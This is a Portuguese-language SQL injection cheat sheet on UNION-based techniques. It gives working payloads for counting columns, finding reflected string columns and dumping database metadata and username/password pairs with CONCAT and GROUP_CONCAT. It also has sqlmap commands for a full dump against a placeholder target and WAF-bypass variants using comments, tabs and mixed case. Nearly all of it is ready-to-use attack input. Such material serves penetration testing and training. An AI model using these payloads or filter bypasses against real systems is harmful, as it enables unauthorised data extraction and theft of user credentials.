# UNION-based SQL Injection

## Como Funciona

Injeta uma cláusula UNION SELECT para adicionar resultados de outra query à resposta original, permitindo extração direta de dados.

```sql
-- Query original: SELECT nome, preco FROM produtos WHERE id=1
-- Injeção:        UNION SELECT usuario, senha FROM usuarios--

-- Resultado: os dados de usuarios aparecem na resposta como se fossem produtos
```

## Quando Usar

- Dados da query são refletidos na resposta (página exibe resultados)
- Número de colunas pode ser determinado
- Técnica mais rápida disponível quando aplicável

## Pré-requisitos

1. Identificar número de colunas da query original
2. Identificar tipo de dados de cada coluna (string/int)
3. Identificar qual coluna é refletida na resposta

## Descoberta do Número de Colunas

### Método ORDER BY
```sql
-- Incrementar até dar erro
' ORDER BY 1--    → sem erro
' ORDER BY 2--    → sem erro
' ORDER BY 3--    → erro → 2 colunas
```

### Método NULL
```sql
' UNION SELECT NULL--         → erro
' UNION SELECT NULL,NULL--    → erro
' UNION SELECT NULL,NULL,NULL-- → funciona → 3 colunas
```

## Identificar Coluna com String

```sql
-- Com 3 colunas, testar qual aceita string
' UNION SELECT 'VLAD',NULL,NULL--
' UNION SELECT NULL,'VLAD',NULL--
' UNION SELECT NULL,NULL,'VLAD'--
```

## Extração de Dados

```sql
-- Banco atual
' UNION SELECT NULL,database(),NULL--

-- Versão
' UNION SELECT NULL,version(),NULL--

-- Usuário atual
' UNION SELECT NULL,user(),NULL--

-- Tabelas
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables
  WHERE table_schema=database()--

-- Colunas de uma tabela
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns
  WHERE table_name='usuarios'--

-- Dados da tabela
' UNION SELECT NULL,CONCAT(login,0x3a,senha),NULL FROM usuarios--
```

## Com SQLMap

```bash
# Detecção UNION
sqlmap -u "http://alvo.com/?id=1" \
  --technique=U \
  --level=1 \
  --batch

# Especificar número de colunas (acelera detecção)
sqlmap -u "http://alvo.com/?id=1" \
  --technique=U \
  --union-cols=3 \
  --batch

# Especificar coluna de string (ex: coluna 2)
sqlmap -u "http://alvo.com/?id=1" \
  --technique=U \
  --union-char="VLAD" \
  --batch

# Extração completa
sqlmap -u "http://alvo.com/?id=1" \
  --technique=U \
  --dbs --tables --dump \
  --batch
```

## Técnica com Resultado Concatenado

Quando apenas uma coluna é refletida mas precisa extrair múltiplos valores:

```sql
-- Concatenar valores (MySQL)
' UNION SELECT NULL,CONCAT(usuario,0x7c,senha,0x7c,email),NULL FROM usuarios--

-- Separador visível: usuario|senha|email
```

## Técnica com Subquery

```sql
-- Extrair múltiplas linhas em uma
' UNION SELECT NULL,GROUP_CONCAT(usuario,0x3a,senha SEPARATOR 0x0a),NULL FROM usuarios--
```

## Limitações

- Requer que dados sejam refletidos na resposta
- Número de colunas deve coincidir
- WAFs frequentemente bloqueiam UNION SELECT

## Bypass de Filtros UNION

```sql
-- Variações de espaço
' UNION/**/SELECT NULL,NULL--
'%09UNION%09SELECT%09NULL,NULL--

-- Maiúsculas alternadas
' uNiOn SeLeCt NULL,NULL--

-- Comentário dentro
' UN/*comentario*/ION SELECT NULL,NULL--
```

## Indicadores de Sucesso SQLMap

```
[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[INFO] the SQL query used returns 3 columns
```
